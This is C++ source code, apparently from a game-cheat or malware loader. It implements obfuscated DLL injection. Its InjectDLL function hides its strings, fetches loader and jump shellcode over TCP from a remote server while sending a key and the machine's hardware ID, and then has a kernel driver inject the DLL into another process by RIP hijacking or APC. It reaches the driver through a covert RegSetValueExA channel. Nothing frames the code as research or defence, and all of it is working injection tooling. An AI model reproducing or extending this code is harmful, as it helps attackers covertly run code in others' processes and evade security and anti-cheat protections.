__declspec(noinline) BOOL InjectDLL(ULONG_PTR Key, CONST VOID* DataPtr, ULONG64 DataSize, INT Type) {
    _Globals* Globals = (_Globals*)(Key ^ GetXorKey());

    typedef struct _NTDLL_APIS {
        ULONG64 LdrGetProcedureAddress;
        ULONG64 LdrLoadDll;
        ULONG64 RtlInitAnsiString;
        ULONG64 RtlAnsiStringToUnicodeString;
        ULONG64 RtlFreeUnicodeString;
    } NTDLL_APIS, * PNTDLL_APIS;

    typedef struct _INJECT_SHELLCODE {
        ULONG64 LoaderPtr;
        ULONG64 LoaderSize;
        ULONG64 JumpPtr;
        ULONG64 JumpSize;
    } INJECT_SHELLCODE, * PINJECT_SHELLCODE;

    NTDLL_APIS* ntdll_apis = NULL;
    CHAR* request_loader = NULL;
    CHAR* response_loader = NULL;
    INT response_loader_size = 0;
    CHAR* request_jump = NULL;
    CHAR* response_jump = NULL;
    INT response_jump_size = 0;
    BOOL result = FALSE;

    ULONG64 ntdllBase = GetModuleAddress(Key, xorstr_("ntdll.dll"), 0, TRUE);
    if (!ntdllBase) goto cleanup;

    ntdll_apis = (NTDLL_APIS*)SecureAlloc(sizeof(NTDLL_APIS));
    if (!ntdll_apis) goto cleanup;

    ntdll_apis->LdrGetProcedureAddress = GetFunctionAddress(Key, ntdllBase, xorstr_("LdrGetProcedureAddress"), 0);
    ntdll_apis->LdrLoadDll = GetFunctionAddress(Key, ntdllBase, xorstr_("LdrLoadDll"), 0);
    ntdll_apis->RtlInitAnsiString = GetFunctionAddress(Key, ntdllBase, xorstr_("RtlInitAnsiString"), 0);
    ntdll_apis->RtlAnsiStringToUnicodeString = GetFunctionAddress(Key, ntdllBase, xorstr_("RtlAnsiStringToUnicodeString"), 0);
    ntdll_apis->RtlFreeUnicodeString = GetFunctionAddress(Key, ntdllBase, xorstr_("RtlFreeUnicodeString"), 0);

    if (!ntdll_apis->LdrGetProcedureAddress || !ntdll_apis->LdrLoadDll || !ntdll_apis->RtlInitAnsiString || !ntdll_apis->RtlAnsiStringToUnicodeString || !ntdll_apis->RtlFreeUnicodeString) goto cleanup;

    request_loader = static_cast<CHAR*>(SecureAlloc(MAX_PATH));
    if (!request_loader) goto cleanup;
    LI_FN(sprintf)(request_loader, xorstr_("InjShellcode_Loader*%s*%s*%s"), Globals->SecretKey, xorstr_(""), Globals->hwid);

    if (!tcpRequest(xorstr_(""), 0, request_loader, &response_loader, &response_loader_size)) goto cleanup;
    if (!verifyDataSource(response_loader, xorstr_(""))) goto cleanup;
    SecureFree(request_loader); request_loader = NULL;

    request_jump = static_cast<CHAR*>(SecureAlloc(MAX_PATH));
    if (!request_jump) goto cleanup;
    LI_FN(sprintf)(request_jump, xorstr_("InjShellcode_Jump*%s*%s*%s"), Globals->SecretKey, xorstr_(""), Globals->hwid);

    if (!tcpRequest(xorstr_(""), 0, request_jump, &response_jump, &response_jump_size)) goto cleanup;
    if (!verifyDataSource(response_jump, xorstr_(""))) goto cleanup;
    SecureFree(request_jump); request_jump = NULL;

    {
        INJECT_SHELLCODE shellInfo;
        shellInfo.LoaderPtr = (ULONG64)(response_loader + 8);
        shellInfo.LoaderSize = response_loader_size - 8;
        shellInfo.JumpPtr = (ULONG64)(response_jump + 8);
        shellInfo.JumpSize = response_jump_size - 8;

        ULONG64 outputbuffer;
        DriverParameter parameter;
        DriverControl Control;

        Control.ProcessId = (ULONG64)ntdll_apis;
        Control.Address = (ULONG64)&shellInfo;
        Control.Size = DataSize;
        Control.Buffer = (ULONG64)DataPtr;
        Control.Type = Type == 1 ? UN_S_RipInjectDLL : UN_S_ApcInjectDLL;

        parameter.Flag = UN_S_InjectDLL;
        parameter.UNKey = UN_MAGICNUMBER;
        parameter.Control = (ULONG64)&Control;
        parameter.OutputBuffer = (ULONG64)&outputbuffer;

        ((LSTATUS(__stdcall*)(HKEY, LPCSTR, DWORD, DWORD, BYTE*, DWORD))Globals->RegSetValueExA)
            (HKEY_CURRENT_USER, NULL, NULL, REG_BINARY, (BYTE*)&parameter, sizeof(parameter));

        result = outputbuffer == 0;
    }

cleanup:
    if (response_loader) SecureFree(response_loader);
    if (response_jump) SecureFree(response_jump);
    if (request_loader) SecureFree(request_loader);
    if (request_jump) SecureFree(request_jump);
    if (ntdll_apis) SecureFree(ntdll_apis);

    return result;
}

__declspec(noinline) ULONG64 GetInjectResult(ULONG_PTR Key) {
    _Globals* Globals = (_Globals*)(Key ^ GetXorKey());

    typedef struct _Inject_Data {
        ULONG64 ProcessID;
        ULONG64 m_Pe_address;
        ULONG64 m_Pe_Size;
        ULONG64 m_loader_shellcode_address;
        ULONG64 m_loader_shellcode_size;
        ULONG64 InjectionResult;
    }Inject_Data, * PInject_Data;

    DriverParameter parameter;
    Inject_Data outputbuffer;

    parameter.Flag = UN_S_Get_Inject_Data;
    parameter.UNKey = UN_MAGICNUMBER;
    parameter.OutputBuffer = (ULONG64)&outputbuffer;

    ((LSTATUS(__stdcall*)(HKEY, LPCSTR, DWORD, DWORD, BYTE*, DWORD))Globals->RegSetValueExA)
        (HKEY_CURRENT_USER, NULL, NULL, REG_BINARY, (BYTE*)&parameter, sizeof(parameter));

    return (ULONG64)&outputbuffer;
}